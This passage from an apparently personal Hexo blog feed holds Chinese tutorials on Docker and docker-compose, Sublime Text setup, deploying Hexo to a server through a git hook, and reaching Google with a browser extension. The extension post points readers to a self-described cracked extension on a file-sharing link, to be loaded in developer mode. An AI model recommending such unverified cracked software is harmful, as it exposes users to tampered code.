挂载到容器的 :/etc/nginx/nginx.conf。配置目录</li><li><strong>-v $PWD/logs:/var/log/nginx</strong>：将主机当前目录下的 logs 目录挂载到容器的/var/log/nginx。日志目录</li></ul></li></ul><ol start="4"><li>使用外部机器访问nginx<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200410163622398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></li></ol><h2 id="四、部署Redis"><a href="#四、部署Redis" class="headerlink" title="四、部署Redis"></a>四、部署Redis</h2><ol><li>搜索redis镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search redis</span><br></pre></td></tr></table></figure><ol start="2"><li>拉取redis镜像</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure><ol start="3"><li>创建容器，设置端口映射</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -id --name=c_redis -p 6379:6379 redis:5.0</span><br></pre></td></tr></table></figure><ol start="4"><li>使用外部机器连接redis</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli.exe -h 192.168.149.135 -p 6379</span><br></pre></td></tr></table></figure><h1 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h1><table><thead><tr><th>关键字</th><th>作用</th><th>备注</th></tr></thead><tbody><tr><td>FROM</td><td>指定父镜像</td><td>指定dockerfile基于那个image构建</td></tr><tr><td>MAINTAINER</td><td>作者信息</td><td>用来标明这个dockerfile谁写的</td></tr><tr><td>LABEL</td><td>标签</td><td>用来标明dockerfile的标签 可以使用Label代替Maintainer 最终都是在docker image基本信息中可以查看</td></tr><tr><td>RUN</td><td>执行命令</td><td>执行一段命令 默认是/bin/sh 格式: RUN command 或者 RUN [“command” , “param1”,”param2”]</td></tr><tr><td>CMD</td><td>容器启动命令</td><td>提供启动容器时候的默认命令 和ENTRYPOINT配合使用.格式 CMD command param1 param2 或者 CMD [“command” , “param1”,”param2”]</td></tr><tr><td>ENTRYPOINT</td><td>入口</td><td>一般在制作一些执行就关闭的容器中会使用</td></tr><tr><td>COPY</td><td>复制文件</td><td>build的时候复制文件到image中</td></tr><tr><td>ADD</td><td>添加文件</td><td>build的时候添加文件到image中 不仅仅局限于当前build上下文 可以来源于远程服务</td></tr><tr><td>ENV</td><td>环境变量</td><td>指定build时候的环境变量 可以在启动的容器的时候 通过-e覆盖 格式ENV name=value</td></tr><tr><td>ARG</td><td>构建参数</td><td>构建参数 只在构建的时候使用的参数 如果有ENV 那么ENV的相同名字的值始终覆盖arg的参数</td></tr><tr><td>VOLUME</td><td>定义外部可以挂载的数据卷</td><td>指定build的image那些目录可以启动的时候挂载到文件系统中 启动容器的时候使用 -v 绑定 格式 VOLUME [“目录”]</td></tr><tr><td>EXPOSE</td><td>暴露端口</td><td>定义容器运行的时候监听的端口 启动容器的使用-p来绑定暴露端口 格式: EXPOSE 8080 或者 EXPOSE 8080/udp</td></tr><tr><td>WORKDIR</td><td>工作目录</td><td>指定容器内部的工作目录 如果没有创建则自动创建 如果指定/ 使用的是绝对地址 如果不是/开头那么是在上一条workdir的路径的相对路径</td></tr><tr><td>USER</td><td>指定执行用户</td><td>指定build或者启动的时候 用户 在RUN CMD ENTRYPONT执行的时候的用户</td></tr><tr><td>HEALTHCHECK</td><td>健康检查</td><td>指定监测当前容器的健康监测的命令 基本上没用 因为很多时候 应用本身有健康监测机制</td></tr><tr><td>ONBUILD</td><td>触发器</td><td>当存在ONBUILD关键字的镜像作为基础镜像的时候 当执行FROM完成之后 会执行 ONBUILD的命令 但是不影响当前镜像 用处也不怎么大</td></tr><tr><td>STOPSIGNAL</td><td>发送信号量到宿主机</td><td>该STOPSIGNAL指令设置将发送到容器的系统调用信号以退出。</td></tr><tr><td>SHELL</td><td>指定执行脚本的shell</td><td>指定RUN CMD ENTRYPOINT 执行命令的时候 使用的shell</td></tr></tbody></table><h1 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker-compose"></a>Docker-compose</h1><h2 id="一、安装Docker-Compose"><a href="#一、安装Docker-Compose" class="headerlink" title="一、安装Docker Compose"></a>一、安装Docker Compose</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Compose目前已经完全支持Linux、Mac OS和Windows，在我们安装Compose之前，需要先安装Docker。下面我 们以编译好的二进制包方式安装在Linux系统中。 </span></span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置文件可执行权限 </span></span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看版本信息 </span></span><br><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><h2 id="二、卸载Docker-Compose"><a href="#二、卸载Docker-Compose" class="headerlink" title="二、卸载Docker Compose"></a>二、卸载Docker Compose</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 二进制包方式安装的，删除二进制文件即可</span></span><br><span class="line">rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h2 id="三、-使用docker-compose编排nginx-springboot项目"><a href="#三、-使用docker-compose编排nginx-springboot项目" class="headerlink" title="三、 使用docker compose编排nginx+springboot项目"></a>三、 使用docker compose编排nginx+springboot项目</h2><ol><li>创建docker-compose目录</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/docker-compose</span><br><span class="line">cd ~/docker-compose</span><br></pre></td></tr></table></figure><ol start="2"><li>编写 docker-compose.yml 文件</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">version: '3'</span><br><span class="line">services:</span><br><span class="line">  nginx:</span><br><span class="line">   image: nginx</span><br><span class="line">   ports:</span><br><span class="line">    - 80:80</span><br><span class="line">   links:</span><br><span class="line">    - app</span><br><span class="line">   volumes:</span><br><span class="line">    - ./nginx/conf.d:/etc/nginx/conf.d</span><br><span class="line">  app:</span><br><span class="line">    image: app</span><br><span class="line">    expose:</span><br><span class="line">      - "8080"</span><br></pre></td></tr></table></figure><ol start="3"><li>创建./nginx/conf.d目录</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ./nginx/conf.d</span><br></pre></td></tr></table></figure><ol start="4"><li>在./nginx/conf.d目录下 编写itheima.conf文件</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    access_log off;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://app:8080;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>在~/docker-compose 目录下 使用docker-compose 启动容器</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><ol start="6"><li>测试访问</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.149.135/hello</span><br></pre></td></tr></table></figure><h1 id="Docker-私有仓库"><a href="#Docker-私有仓库" class="headerlink" title="Docker 私有仓库"></a>Docker 私有仓库</h1><h2 id="一、私有仓库搭建"><a href="#一、私有仓库搭建" class="headerlink" title="一、私有仓库搭建"></a>一、私有仓库搭建</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、拉取私有仓库镜像 </span></span><br><span class="line">docker pull registry</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、启动私有仓库容器 </span></span><br><span class="line">docker run -id --name=registry -p 5000:5000 registry</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3、打开浏览器 输入地址http://私有仓库服务器ip:5000/v2/_catalog，看到&#123;<span class="string">"repositories"</span>:[]&#125; 表示私有仓库 搭建成功</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 4、修改daemon.json   </span></span><br><span class="line">vim /etc/docker/daemon.json    </span><br><span class="line"><span class="meta">#</span><span class="bash"> 在上述文件中添加一个key，保存退出。此步用于让 docker 信任私有仓库地址；注意将私有仓库服务器ip修改为自己私有仓库服务器真实ip </span></span><br><span class="line">&#123;"insecure-registries":["私有仓库服务器ip:5000"]&#125; </span><br><span class="line"><span class="meta">#</span><span class="bash"> 5、重启docker 服务 </span></span><br><span class="line">systemctl restart docker</span><br><span class="line">docker start registry</span><br></pre></td></tr></table></figure><h2 id="二、将镜像上传至私有仓库"><a href="#二、将镜像上传至私有仓库" class="headerlink" title="二、将镜像上传至私有仓库"></a>二、将镜像上传至私有仓库</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、标记镜像为私有仓库的镜像     </span></span><br><span class="line">docker tag centos:7 私有仓库服务器IP:5000/centos:7</span><br><span class="line"> </span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、上传标记的镜像     </span></span><br><span class="line">docker push 私有仓库服务器IP:5000/centos:7</span><br></pre></td></tr></table></figure><h2 id="三、-从私有仓库拉取镜像"><a href="#三、-从私有仓库拉取镜像" class="headerlink" title="三、 从私有仓库拉取镜像"></a>三、 从私有仓库拉取镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">拉取镜像 </span></span><br><span class="line">docker pull 私有仓库服务器ip:5000/centos:7</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;文章为黑马教程培训资料，B站视频教程：&lt;a href=&quot;https://www.bilibili.com/video/BV167411g7Lg&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;点我查看&lt;/a&gt;&lt;/p&gt;
&lt;/block
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="Docker" scheme="http://zssblog.top/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>sublime教程</title>
    <link href="http://zssblog.top/2020/04/08/sublime%E6%95%99%E7%A8%8B/"/>
    <id>http://zssblog.top/2020/04/08/sublime%E6%95%99%E7%A8%8B/</id>
    <published>2020-04-08T09:45:00.000Z</published>
    <updated>2020-05-31T10:14:56.423Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="下载sublime"><a href="#下载sublime" class="headerlink" title="下载sublime"></a>下载sublime</h1><p>进官网：<a href="https://www.sublimetextcn.com/3/下载相应版本" target="_blank" rel="noopener">https://www.sublimetextcn.com/3/下载相应版本</a></p><p>大家应该都是用的Windows，选择64位即可</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200408170952010.png"  alt="image-20200408170952010"></p><h1 id="安装Package-Control"><a href="#安装Package-Control" class="headerlink" title="安装Package Control"></a>安装Package Control</h1><p>要想在sublime text 3中安装插件，我们首先需要安装一下包管理器（packages control），在编辑器中使用快捷键 <strong>Ctrl+`</strong> 打开控制台，并输入如下代码，然后回车：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request,os,hashlib; h = <span class="string">'df21e130d211cfc94d9b0905775a7c0f'</span> + <span class="string">'1e3d39e33b79698005270310898eea76'</span>; pf = <span class="string">'Package Control.sublime-package'</span>; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); <span class="keyword">by</span> = urllib.request.urlopen( <span class="string">'http://packagecontrol.io/'</span> + pf.replace(<span class="string">' '</span>, <span class="string">'%20'</span>)).read(); dh = hashlib.sha256(<span class="keyword">by</span>).hexdigest(); print(<span class="string">'Error validating download (got %s instead of %s), please try manual install'</span> % (dh, h)) <span class="keyword">if</span> dh != h <span class="keyword">else</span> <span class="keyword">open</span>(os.path.join( ipp, pf), <span class="string">'wb'</span> ).write(<span class="keyword">by</span>)</span><br></pre></td></tr></table></figure><p>完成上述安装之后，查看菜单栏Preferences下出现<strong>Package Control</strong>选项则表明安装成功，如下图所示：</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200408171234853.png"  alt="image-20200408171234853"></p><p>接下来，我们就可以使用Package Control来完成我们的插件安装了，具体操作如下：</p><p>使用快捷键 <strong>Ctrl+Shift+P</strong> 打开Package Control，如下图所示</p><p>在打开的窗口中输入install 并选择<strong>Install Package</strong>选项，然后回车</p><h1 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h1><h2 id="ChineseLocalization"><a href="#ChineseLocalization" class="headerlink" title="ChineseLocalization"></a>ChineseLocalization</h2><p>可实现汉化，安装完成后重新打开即汉化成功</p><h2 id="LiveReload"><a href="#LiveReload" class="headerlink" title="LiveReload"></a>LiveReload</h2><p>强烈推荐这个，可以实现sublime里保存后浏览器立即刷新，不用编辑器保存再去浏览器刷新了</p><p>sublime里下载插件</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200408171900385.png"  alt="image-20200408171900385"></p><p>浏览器下载插件，这里我用的是谷歌浏览器</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200408172046415.png"  alt="image-20200408172046415"></p><p>下载好后右上角出现一个圆圈标志，我们要改下设置</p><p>右键图标选择管理拓展程序，下滑找到允许访问文件地址，选上这项</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-2020.png"  alt="image-2020"></p><p>至此就配置好了，接下来让我们看看怎么使用吧</p><p>浏览器里打开我们的网页，点击livereload图标，它中间会出现个小点即可</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200408173449272.png"  alt="image-20200408173449272"></p><p>sublime里按快捷键Ctrl+shift+p输入livereload回车</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200408172811637.png"  alt="image-20200408172811637"></p><p>选择simple reload回车，然后我们在sublime改变网页内容Ctrl+s保存后，浏览器就会立即刷新</p><h1 id="sublime使用技巧"><a href="#sublime使用技巧" class="headerlink" title="sublime使用技巧"></a>sublime使用技巧</h1><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><ul><li><p>ctrl+shift+/：选中一部分后即可注释</p></li><li><p>Ctrl+D： 选词 （反复按快捷键，即可继续向下同时选中下一个相同的文本进行同时编辑）</p></li><li><p>Ctrl+Shift+P： 打开命令面板</p></li><li><p>Ctrl+Shift+[： 折叠代码</p></li><li><p>Ctrl+Shift+]： 展开代码</p></li><li><p>更多自行搜索</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>菜单栏中选择项目-&gt;添加文件夹到项目就可以在左侧更方便的更改文件</li></ul><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200408174231585.png"  alt="image-20200408174231585"></p><ul><li>sublime里可以运行Python、java、php代码，需手动配置，感兴趣的自行搜索。</li></ul><h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><p>由于我已经安装了sublime，上面步骤有的是网上搜的并没实际操作，如遇到问题，下方留言即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;下载sublime&quot;&gt;&lt;a href=&quot;#下载sublime&quot; class=&quot;headerlink&quot; title=&quot;下载sublime&quot;&gt;&lt;/a&gt;下载sublime&lt;/h1&gt;&lt;p&gt;进官网：&lt;a href=&quot;https://www.sublimetextc
      
    
    </summary>
    
    
      <category term="107网站工作室" scheme="http://zssblog.top/categories/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
    
      <category term="107网站工作室" scheme="http://zssblog.top/tags/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
  </entry>
  
  <entry>
    <title>从github迁移hexo博客到服务器</title>
    <link href="http://zssblog.top/2020/04/08/%E4%BB%8Egithub%E8%BF%81%E7%A7%BBhexo%E5%8D%9A%E5%AE%A2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://zssblog.top/2020/04/08/%E4%BB%8Egithub%E8%BF%81%E7%A7%BBhexo%E5%8D%9A%E5%AE%A2%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-04-08T07:08:00.000Z</published>
    <updated>2020-04-08T08:42:28.267Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>需要本地hexo博客已搭建完毕，以下是在服务器以root用户操作</p></blockquote><h1 id="登录云服务器安装git和nginx"><a href="#登录云服务器安装git和nginx" class="headerlink" title="登录云服务器安装git和nginx"></a>登录云服务器安装git和nginx</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure><p>这样以后输入服务器地址会打开nginx默认页面</p><h1 id="修改默认打开页面"><a href="#修改默认打开页面" class="headerlink" title="修改默认打开页面"></a>修改默认打开页面</h1><p><strong>也可不修改默认打开页面只需将博客文件放到/var/www/html下即可</strong></p><p>找到nginx配置文件，我这是/etc/nginx/sites-available下的default文件，建议先备份</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim default</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200407225936259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>重新载入Nginx，使配置生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx reload</span><br></pre></td></tr></table></figure><blockquote><p>如果报错，看看找对配置文件没，实在改不过来恢复原来的备份文件，执行命令后没什么显示即执行成功</p></blockquote><h1 id="创建一个Git裸库，只用于保存Repository信"><a href="#创建一个Git裸库，只用于保存Repository信" class="headerlink" title="创建一个Git裸库，只用于保存Repository信"></a>创建一个Git裸库，只用于保存Repository信</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">git init --bare blogit.git</span><br></pre></td></tr></table></figure><p>使用Git-Hooks同步网站根目录，这里使用的是Git中的“post-receive”，当有Git收发的时候会调用该脚本，自动将最新内容同步到网站根目录中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim blogit.git/hooks/post-receive</span><br></pre></td></tr></table></figure><p>将以下语句写入文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">git --work-tree=/opt/hexo --git-dir=/root/blogit.git checkout -f</span><br></pre></td></tr></table></figure><blockquote><p>注意博客路径和当前用户</p></blockquote><p>保存并赋予执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /root/blogit.git/hooks/post-receive</span><br></pre></td></tr></table></figure><h1 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h1><p>配置”_config.yml”</p><p>打开位于Hexo博客根目录下的“_config.yml”文件，找到“deploy”并修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">-  <span class="built_in">type</span>: git</span><br><span class="line">   repository: git@github.com:zss192/zss192.github.io.git</span><br><span class="line">   branch: master</span><br><span class="line">-  <span class="built_in">type</span>: git</span><br><span class="line">   repository: root@39.107.45.243:/root/blogit.git</span><br><span class="line">   branch: master      <span class="comment"># 分支</span></span><br></pre></td></tr></table></figure><blockquote><p>注意若原来type: git前面没有-这个符号要手动添加上，不然后面会报错</p></blockquote><p>本地执行下列命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>这样以后hexo d的时候就会推到github和个人服务器上了</p><h1 id="hexo-d免密码"><a href="#hexo-d免密码" class="headerlink" title="hexo d免密码"></a>hexo d免密码</h1><p>经过上述操作我们每次使用hexo d的时候就会推到服务器上，但是每次都要输入密码，添加秘钥免密推送</p><p>进入～/.ssh找到id_rsa.pub改为 anthorized_keys并上传到服务器你的主目录下的.ssh下即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp id_rsa.pub authorized_keys</span><br><span class="line">scp authorized_keys username@服务器地址:~/.ssh</span><br></pre></td></tr></table></figure><p>若没秘钥本地输入ssh-keygen -t rsa生成即可</p><p>这样后就会github和服务器同步更新了，即使以后更换服务器只需按照上述步骤操作下即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;需要本地hexo博客已搭建完毕，以下是在服务器以root用户操作&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;登录云服务器安装git和nginx&quot;&gt;&lt;a href=&quot;#登录云服务器安装git和nginx&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="hexo" scheme="http://zssblog.top/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>谷歌访问之插件篇</title>
    <link href="http://zssblog.top/2020/04/07/%E8%B0%B7%E6%AD%8C%E8%AE%BF%E9%97%AE%E4%B9%8B%E6%8F%92%E4%BB%B6%E7%AF%87/"/>
    <id>http://zssblog.top/2020/04/07/%E8%B0%B7%E6%AD%8C%E8%AE%BF%E9%97%AE%E4%B9%8B%E6%8F%92%E4%BB%B6%E7%AF%87/</id>
    <published>2020-04-07T07:17:00.000Z</published>
    <updated>2020-05-31T10:10:17.261Z</updated>
    
    <content type="html"><![CDATA[<hr><blockquote><p>我们知道正常情况下我们无法直接访问谷歌，一般解决办法有使用代理和插件(类似代理)，今天我们先介绍通过一个插件访问谷歌</p></blockquote><h2 id="为什么要用谷歌搜索"><a href="#为什么要用谷歌搜索" class="headerlink" title="为什么要用谷歌搜索"></a>为什么要用谷歌搜索</h2><p>1.格局大小的区别，互联网和局域网的区别。你在google面前，可以看到整个互联网，而你打开百度，只看到的中国局域网。这是格局所限，百度几乎不可能改变这个现状。</p><p>2.google更有商业道德，用过百度的都知道，各种广告，竞价排名充斥着整个搜索界面，将用户想看到的内容放在第三页，甚至更靠后。而谷歌搜索出来，第一页甚至第一条就是你想看到的内容，没有任何竞价配排名广告，更不会出现莆田系的医院祸害用户。</p><h2 id="谷歌浏览器"><a href="#谷歌浏览器" class="headerlink" title="谷歌浏览器"></a>谷歌浏览器</h2><p>首先我们需要下载谷歌浏览器，地址：<a href="https://www.google.com/intl/zh-CN/chrome/" target="_blank" rel="noopener">https://www.google.com/intl/zh-CN/chrome/</a><br>直接可以访问不用代理即可下载</p><h2 id="谷歌访问助手"><a href="#谷歌访问助手" class="headerlink" title="谷歌访问助手"></a>谷歌访问助手</h2><p>资源下载地址：</p><p><a href="https://pan.baidu.com/s/1q6O16yBH2-MsILZb7Np7uA" target="_blank" rel="noopener">https://pan.baidu.com/s/1q6O16yBH2-MsILZb7Np7uA</a> </p><p>密码：ey1h<br>下载好后解压，移动到不容易误删的地方，我一般和谷歌浏览器放在一起。</p><p>然后我们打开拓展程序<img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200313182428463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>先打开右面的开发者模式，然后选择左面的加载已解压的拓展程序。<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020031318252353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>然后选择刚才下载的文件夹<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020031318265677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>这时浏览器会自动打开这个页面就说明我们安装好了<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200313182732686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br>接下来就可以愉快的使用谷歌搜索了。</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>此插件为破解版的，谷歌网上商店有正版的但是会更改我们浏览器的主页，如有需要自行下载。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>后续会发些</p><ul><li>浏览器常用插件</li><li>插件访问外网</li><li>ssr访问外网 (我目前在用)</li><li>关于电脑使用的一些小技巧 </li></ul><p><strong>你的关注是我最大的动力。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;我们知道正常情况下我们无法直接访问谷歌，一般解决办法有使用代理和插件(类似代理)，今天我们先介绍通过一个插件访问谷歌&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;为什么要用谷歌搜索&quot;&gt;&lt;a href=&quot;#为什么要用谷歌搜索&quot; cl
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>实验三 栈和队列的操作</title>
    <link href="http://zssblog.top/2020/04/07/%E5%AE%9E%E9%AA%8C%E4%B8%89%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%9A%84%E6%93%8D%E4%BD%9C/"/>
    <id>http://zssblog.top/2020/04/07/%E5%AE%9E%E9%AA%8C%E4%B8%89%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%9A%84%E6%93%8D%E4%BD%9C/</id>
    <published>2020-04-07T07:17:00.000Z</published>
    <updated>2020-05-31T10:06:01.368Z</updated>
    
